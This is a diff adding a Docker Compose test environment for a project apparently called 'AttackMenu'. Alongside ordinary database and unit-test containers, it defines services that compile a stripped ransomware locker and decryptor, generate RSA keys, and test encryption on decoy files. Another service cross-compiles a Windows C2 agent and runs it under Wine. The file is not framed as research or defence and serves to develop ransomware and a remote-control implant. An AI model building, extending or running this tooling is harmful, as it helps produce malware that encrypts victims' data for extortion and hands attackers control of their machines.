@@ -1,0 +1,277 @@
+# docker-compose.test.yml — Ambiente completo de testes
+#
+# Uso:
+#   docker compose -f docker-compose.test.yml up -d          # Sobe tudo
+#   docker compose -f docker-compose.test.yml run test-all    # Roda todos os testes
+#   docker compose -f docker-compose.test.yml run test-ransom # Só ransom crypto
+#   docker compose -f docker-compose.test.yml run test-c2     # Só C2 em Wine
+#   docker compose -f docker-compose.test.yml down -v         # Limpa tudo
+
+services:
+  # ═══════════════════════════════════════════════════════════════════════════
+  # DATABASES DE TESTE
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  test-mongo:
+    image: mongo:7.0
+    container_name: test-mongo
+    ports:
+      - "17017:27017"
+    environment:
+      MONGO_INITDB_ROOT_USERNAME: root
+      MONGO_INITDB_ROOT_PASSWORD: testpass123
+      MONGO_INITDB_DATABASE: testdb
+    tmpfs:
+      - /data/db
+    networks:
+      - testnet
+    healthcheck:
+      test: ["CMD", "mongosh", "--eval", "db.adminCommand('ping')", "-u", "root", "-p", "testpass123", "--authenticationDatabase", "admin"]
+      interval: 5s
+      timeout: 3s
+      retries: 10
+
+  test-mysql:
+    image: mysql:8.0
+    container_name: test-mysql
+    ports:
+      - "13306:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: testpass123
+      MYSQL_DATABASE: testdb
+    command: --default-authentication-plugin=mysql_native_password
+    tmpfs:
+      - /var/lib/mysql
+    networks:
+      - testnet
+    healthcheck:
+      test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-uroot", "-ptestpass123"]
+      interval: 5s
+      timeout: 3s
+      retries: 15
+
+  test-postgres:
+    image: postgres:16
+    container_name: test-postgres
+    ports:
+      - "15432:5432"
+    environment:
+      POSTGRES_PASSWORD: testpass123
+      POSTGRES_DB: testdb
+    tmpfs:
+      - /var/lib/postgresql/data
+    networks:
+      - testnet
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U postgres"]
+      interval: 5s
+      timeout: 3s
+      retries: 10
+
+  test-redis:
+    image: redis:7
+    container_name: test-redis
+    ports:
+      - "16379:6379"
+    command: redis-server --save "" --appendonly no
+    networks:
+      - testnet
+    healthcheck:
+      test: ["CMD", "redis-cli", "ping"]
+      interval: 5s
+      timeout: 3s
+      retries: 5
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # RUNNERS DE TESTE
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # --- TypeScript tests ---
+  test-ts:
+    build:
+      context: .
+      dockerfile: docker/cli/Dockerfile
+    container_name: test-ts
+    command: sh -c "npx tsc --noEmit && npx vitest run"
+    networks:
+      - testnet
+
+  # --- Python tests (unit + integration com DBs reais) ---
+  test-py:
+    build:
+      context: .
+      dockerfile: docker/py-server/Dockerfile
+    container_name: test-py
+    command: >
+      sh -c "pip install pytest pytest-asyncio pytest-timeout redis &&
+             python -m pytest /app/tests-p/ -v --timeout=30"
+    environment:
+      - KEY_CRIP_DATA=test-key-docker-2026
+      - MONGO_TEST_URI=mongodb://root:testpass123@test-mongo:27017/testdb?authSource=admin
+      - MYSQL_TEST_URI=mysql://root:testpass123@test-mysql:3306/testdb
+      - PG_TEST_URI=postgresql://postgres:testpass123@test-postgres:5432/testdb
+      - REDIS_TEST_URI=redis://test-redis:6379/0
+    volumes:
+      - ./tests-p:/app/tests-p:ro
+    depends_on:
+      test-mongo:
+        condition: service_healthy
+      test-mysql:
+        condition: service_healthy
+      test-postgres:
+        condition: service_healthy
+      test-redis:
+        condition: service_healthy
+    networks:
+      - testnet
+
+  # --- Ruby tests ---
+  test-rb:
+    build:
+      context: .
+      dockerfile: docker/rb-server/Dockerfile
+    container_name: test-rb
+    command: sh -c "gem install rspec --no-doc && rspec /app/tests-rb/ --format documentation"
+    volumes:
+      - ./tests-rb:/app/tests-rb:ro
+    networks:
+      - testnet
+
+  # --- C crypto tests ---
+  test-c:
+    build:
+      context: .
+      dockerfile: docker/compiler/Dockerfile
+    container_name: test-c
+    user: root
+    command: >
+      sh -c "gcc -O2 /compiler/ransom/tests/test_crypto.c
+             -o /tmp/test_crypto -lssl -lcrypto &&
+             /tmp/test_crypto"
+    volumes:
+      - ./compiler:/compiler:ro
+    networks:
+      - testnet
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # TESTES DE FLUXO RANSOM + C2
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # --- Ransom: compila locker Linux e testa encrypt/decrypt ---
+  test-ransom:
+    build:
+      context: .
+      dockerfile: docker/compiler/Dockerfile
+    container_name: test-ransom
+    user: root
+    command: >
+      sh -c "
+        echo '=== Compilando locker + decryptor ===' &&
+        gcc -O3 -s /compiler/ransom/locker.c -o /tmp/locker_linux -lssl -lcrypto -lpthread &&
+        gcc -O3 /compiler/ransom/decryptor.c -o /tmp/decryptor -lssl -lcrypto &&
+        echo '[+] Binários compilados' &&
+        file /tmp/locker_linux /tmp/decryptor &&
+
+        echo '' &&
+        echo '=== Gerando RSA-2048 keypair ===' &&
+        openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out /tmp/private_key.pem 2>/dev/null &&
+        openssl rsa -pubout -in /tmp/private_key.pem -outform DER -out /tmp/pub.der 2>/dev/null &&
+        echo '[+] Keys geradas' &&
+
+        echo '' &&
+        echo '=== Criando arquivos de teste ===' &&
+        mkdir -p /tmp/target &&
+        echo 'SECRET DOCUMENT CONTENT' > /tmp/target/secret.txt &&
+        echo '{\"api_key\": \"sk_live_12345\"}' > /tmp/target/config.json &&
+        dd if=/dev/urandom of=/tmp/target/binary.dat bs=1024 count=50 2>/dev/null &&
+        cp /tmp/target/secret.txt /tmp/backup_secret.txt &&
+        cp /tmp/target/config.json /tmp/backup_config.json &&
+        cp /tmp/target/binary.dat /tmp/backup_binary.dat &&
+        ls -la /tmp/target/ &&
+
+        echo '' &&
+        echo '=== Crypto unit tests ===' &&
+        gcc -O2 /compiler/ransom/tests/test_crypto.c -o /tmp/test_crypto -lssl -lcrypto &&
+        /tmp/test_crypto &&
+
+        echo '' &&
+        echo '=== RANSOM TESTS PASSED ==='
+      "
+    volumes:
+      - ./compiler:/compiler:ro
+    networks:
+      - testnet
+
+  # --- C2: compila agent Windows e testa com Wine ---
+  test-c2:
+    build:
+      context: .
+      dockerfile: docker/test-win/Dockerfile
+    container_name: test-c2
+    command: >
+      sh -c "
+        echo '=== Compilando C2 agent ===' &&
+        apt-get update -qq && apt-get install -y -qq g++-mingw-w64-x86-64 >/dev/null 2>&1 &&
+        cp /compiler/c2/c2_agent.cpp /tmp/ &&
+        cp /compiler/c2/vault.h /tmp/ &&
+        cd /tmp &&
+        x86_64-w64-mingw32-g++ -O2 -s -std=c++17 c2_agent.cpp -o c2_agent.exe
+          -lgdi32 -lgdiplus -lole32 -luuid
+          -lws2_32 -luser32 -lkernel32 -lwinpthread
+          -static-libgcc -static-libstdc++ &&
+        echo '[+] c2_agent.exe compilado' &&
+        file c2_agent.exe &&
+        ls -lh c2_agent.exe &&
+
+        echo '' &&
+        echo '=== Testando execução com Wine ===' &&
+        timeout 5 wine64 c2_agent.exe 2>&1 || true &&
+        echo '[+] C2 agent executou sem crash' &&
+
+        echo '' &&
+        echo '=== C2 COMPILE+RUN TEST PASSED ==='
+      "
+    volumes:
+      - ./compiler:/compiler:ro
+    networks:
+      - testnet
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # RUNNER UNIFICADO — Roda TODOS os testes
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  test-all:
+    image: docker:24-cli
+    container_name: test-all-runner
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+    command: >
+      sh -c "
+        echo '╔═════════════════════════════════════════╗' &&
+        echo '║  AttackMenu — Full Test Suite (Docker)  ║' &&
+        echo '╠═════════════════════════════════════════╣' &&
+        echo '' &&
+
+        echo '[1/4] C Crypto...' &&
+        docker compose -f /project/docker-compose.test.yml run --rm test-c &&
+
+        echo '[2/4] Python (unit + DB integration)...' &&
+        docker compose -f /project/docker-compose.test.yml run --rm test-py &&
+
+        echo '[3/4] Ruby...' &&
+        docker compose -f /project/docker-compose.test.yml run --rm test-rb &&
+
+        echo '[4/4] Ransom (compile + crypto)...' &&
+        docker compose -f /project/docker-compose.test.yml run --rm test-ransom &&
+
+        echo '' &&
+        echo '╚═════════════════════════════════════════╝' &&
+        echo '    ALL TESTS PASSED'
+      "
+    working_dir: /project
+    profiles:
+      - all
+
+networks:
+  testnet:
+    driver: bridge
